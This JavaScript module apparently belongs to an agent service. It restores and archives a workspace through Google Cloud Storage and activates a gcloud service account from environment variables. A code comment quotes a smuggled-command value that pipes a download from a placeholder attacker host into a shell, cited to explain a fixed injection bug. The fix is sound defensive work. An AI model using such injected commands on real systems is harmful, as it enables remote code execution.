import { execFileSync } from 'child_process';
import { existsSync, mkdirSync, unlinkSync, writeFileSync, mkdtempSync, rmSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

const ARCHIVE_NAME = 'workspace.tar.gz';

// execFileSync, never execSync: `args` carry request-supplied values (the
// bucket and path come straight off the /start payload), and joining them into
// a shell string made `s3_bucket: "x; curl attacker|sh; #"` execute. Passing an
// argv array bypasses the shell entirely, so metacharacters stay data.
// Flag injection is not reachable either — every value is interpolated into a
// `gs://…` URI or is an internal constant, so no argument can start with `-`.
function gsutil(...args) {
  try {
    execFileSync('gsutil', args, { stdio: 'pipe' });
    console.log('[pi-agent] gsutil', args.join(' '), 'ok');
    return true;
  } catch (e) {
    console.warn('[pi-agent] gsutil', args.join(' '), 'failed:', e.stderr?.toString() || e.message);
    return false;
  }
}

export function activateGcloudServiceAccount() {
  for (const key of Object.keys(process.env)) {
    if (!key.endsWith('_JSON')) continue
    const original = key.slice(0, -'_JSON'.length)
    try {
      const dir = mkdtempSync(join(tmpdir(), 'gcp-cred-'))
      const tmpPath = join(dir, `${original}.json`)
      writeFileSync(tmpPath, process.env[key])
      process.env[original] = tmpPath
    } catch (e) {
      console.warn(`[pi-agent] failed to materialize ${key} to temp file:`, e.message)
    }
  }
  const keyFile = process.env.GOOGLE_APPLICATION_CREDENTIALS
  if (!keyFile) {
    console.log('[pi-agent] GOOGLE_APPLICATION_CREDENTIALS not set, skipping gcloud SA activation')
    return
  }
  try {
    execFileSync('gcloud', ['auth', 'activate-service-account', `--key-file=${keyFile}`], { stdio: 'pipe', timeout: 30000 })
    console.log('[pi-agent] gcloud service account activated')
  } catch (e) {
    console.warn('[pi-agent] gcloud activate-service-account failed:', e.stderr?.toString() || e.message)
  }
}

export function downloadWorkspace(extra, workspaceDir) {
  const bucket = extra.s3_bucket || '';
  const s3path = extra.s3_path || '';
  if (!bucket || !s3path) {
    console.log('[pi-agent] downloadWorkspace: no bucket/path configured, skipping');
    return false;
  }
  const gcsUri = `gs://${bucket}/${s3path}/${ARCHIVE_NAME}`;
  console.log('[pi-agent] downloadWorkspace: attempting restore from', gcsUri);
  if (!gsutil('ls', gcsUri)) {
    console.log('[pi-agent] downloadWorkspace: no archive found at', gcsUri);
    return false;
  }
  const localArchive = `/tmp/${ARCHIVE_NAME}`;
  if (!gsutil('cp', gcsUri, localArchive)) {
    console.warn('[pi-agent] downloadWorkspace: gsutil cp failed');
    return false;
  }
  rmSync(workspaceDir, { recursive: true, force: true });
  mkdirSync(workspaceDir, { recursive: true });
  try {
    execFileSync('tar', ['xzf', localArchive, '-C', workspaceDir], { stdio: 'pipe' });
    unlinkSync(localArchive);
    console.log('[pi-agent] downloadWorkspace: restored workspace from', gcsUri);
    return true;
  } catch (e) {
    console.warn('[pi-agent] downloadWorkspace: tar extract failed:', e.stderr?.toString() || e.message);
    return false;
  }
}

export function uploadWorkspace(extra, workspaceDir) {
  const bucket = extra.s3_bucket || '';
  const s3path = extra.s3_path || '';
  if (!bucket || !s3path) {
    console.log('[pi-agent] uploadWorkspace: no bucket/path configured, skipping');
    return null;
  }
  if (!existsSync(workspaceDir)) {
    console.log('[pi-agent] uploadWorkspace: workspace dir does not exist, skipping');
    return null;
  }
  console.log('[pi-agent] uploadWorkspace: attempting to archive and upload', workspaceDir);
  const localArchive = `/tmp/${ARCHIVE_NAME}`;
  try {
    execFileSync('tar', ['czf', localArchive, '-C', workspaceDir, '.'], { stdio: 'pipe' });
  } catch (e) {
    console.warn('[pi-agent] uploadWorkspace: tar create failed:', e.stderr?.toString() || e.message);
    return null;
  }
  const gcsUri = `gs://${bucket}/${s3path}/${ARCHIVE_NAME}`;
  if (!gsutil('cp', localArchive, gcsUri)) {
    console.warn('[pi-agent] uploadWorkspace: gsutil cp failed');
    unlinkSync(localArchive);
    return null;
  }
  unlinkSync(localArchive);
  console.log('[pi-agent] uploadWorkspace: uploaded workspace to', gcsUri);
  return gcsUri;
}
